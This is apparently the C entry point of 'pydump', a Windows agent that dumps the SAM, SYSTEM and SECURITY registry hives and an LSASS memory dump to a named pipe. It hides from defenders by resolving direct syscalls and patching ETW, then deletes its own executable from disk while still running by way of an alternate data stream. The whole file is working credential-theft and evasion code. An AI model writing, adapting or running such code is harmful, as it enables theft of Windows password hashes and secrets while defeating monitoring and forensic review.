/**
 * pydump agent — entry point.
 *
 * Usage: agent.exe <MODE> <PID> <PIPE_NAME>
 *   MODE: bitmask — 1=registry, 2=LSASS, 3=both
 *   PID:  LSASS process ID (ignored if mode doesn't include LSASS)
 *
 * Protocol (on the named pipe):
 *   "PYD\x01"                          magic (4 bytes)
 *   <u32 size><data>                   SYSTEM hive  (0 if skipped)
 *   <u32 size><data>                   SAM hive     (0 if skipped)
 *   <u32 size><data>                   SECURITY hive(0 if skipped)
 *   <remaining bytes until close>      LSASS MDMP   (if mode & 2)
 */

#include <windows.h>
#include "../include/syscalls.h"
#include "../include/agent.h"
#include "../include/registry.h"

// Simple wide-string to int
static DWORD wtoi(const wchar_t *s) {
    DWORD val = 0;
    while (*s >= L'0' && *s <= L'9') {
        val = val * 10 + (*s - L'0');
        s++;
    }
    return val;
}

// Self-delete: rename running EXE to ADS, then mark for deletion.
// The file disappears from disk while the process is still running.
static void self_delete(void) {
    wchar_t path[MAX_PATH];
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return;

    // Step 1: Open our own file with DELETE access
    HANDLE hFile = CreateFileW(path, DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    // Step 2: Rename to an alternate data stream (makes the base file "empty")
    // FILE_RENAME_INFO: ReplaceIfExists(4) + RootDirectory(8) + FileNameLength(4) + FileName[]
    BYTE rename_buf[64] = {0};
    *(DWORD *)&rename_buf[0] = 0;        // ReplaceIfExists = FALSE
    *(DWORD *)&rename_buf[8] = 0;        // RootDirectory = NULL (high dword)
    *(DWORD *)&rename_buf[12] = 4;       // FileNameLength = 4 bytes (":x")
    rename_buf[16] = ':'; rename_buf[17] = 0;  // L':'
    rename_buf[18] = 'x'; rename_buf[19] = 0;  // L'x'

    // SetFileInformationByHandle with FileRenameInfo (class 3)
    typedef BOOL (WINAPI *SetFileInfo_t)(HANDLE, int, LPVOID, DWORD);
    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
    SetFileInfo_t pSetFileInfo = (SetFileInfo_t)GetProcAddress(k32, "SetFileInformationByHandle");
    if (!pSetFileInfo) { CloseHandle(hFile); return; }

    if (!pSetFileInfo(hFile, 3 /*FileRenameInfo*/, rename_buf, sizeof(rename_buf))) {
        CloseHandle(hFile);
        return;
    }
    CloseHandle(hFile);

    // Step 3: Open the now-empty base file and mark for deletion
    hFile = CreateFileW(path, DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    // FILE_DISPOSITION_INFO: DeleteFile = TRUE
    BYTE disp_buf[4] = {1, 0, 0, 0};
    pSetFileInfo(hFile, 4 /*FileDispositionInfo*/, disp_buf, sizeof(disp_buf));
    CloseHandle(hFile);
}

// Entry point — no CRT dependency for smaller binary
void main_entry(void) {
    // Parse command line: "agent.exe <MODE> <PID> <PIPE_NAME>"
    wchar_t *cmdline = GetCommandLineW();

    // Skip executable name
    wchar_t *p = cmdline;
    if (*p == L'"') {
        p++;
        while (*p && *p != L'"') p++;
        if (*p) p++;
    } else {
        while (*p && *p != L' ') p++;
    }
    while (*p == L' ') p++;

    // Parse MODE (1=registry, 2=lsass, 3=both)
    DWORD mode = wtoi(p);
    while (*p && *p != L' ') p++;
    while (*p == L' ') p++;

    // Parse PID
    DWORD pid = wtoi(p);
    while (*p && *p != L' ') p++;
    while (*p == L' ') p++;

    // Remaining is pipe name
    wchar_t *pipe_name = p;
    wchar_t *end = pipe_name;
    while (*end && *end != L' ' && *end != L'\r' && *end != L'\n') end++;
    *end = L'\0';

    if (mode == 0 || pipe_name[0] == L'\0') {
        ExitProcess(1);
    }

    // Step 1: Resolve syscalls
    if (!resolve_syscalls()) {
        ExitProcess(2);
    }

    // Step 2: Patch ETW
    patch_etw();

    // Step 3: Create named pipe
    HANDLE pipe = open_named_pipe(pipe_name);
    if (!pipe) {
        ExitProcess(3);
    }

    // Step 4: Protocol header
    BYTE magic[4] = {'P', 'Y', 'D', 0x01};
    write_pipe(pipe, magic, 4);

    // Step 5: Registry hives (if mode & 1)
    if (mode & 1) {
        init_registry();
        dump_registry_hives(pipe);
    } else {
        // Send 3 empty hive slots
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
    }

    // Step 6: LSASS dump (if mode & 2)
    BOOL success = TRUE;
    if ((mode & 2) && pid > 0) {
        success = dump_lsass(pid, pipe);
    }

    // Step 7: Cleanup
    close_pipe(pipe);
    self_delete();

    ExitProcess(success ? 0 : 4);
}
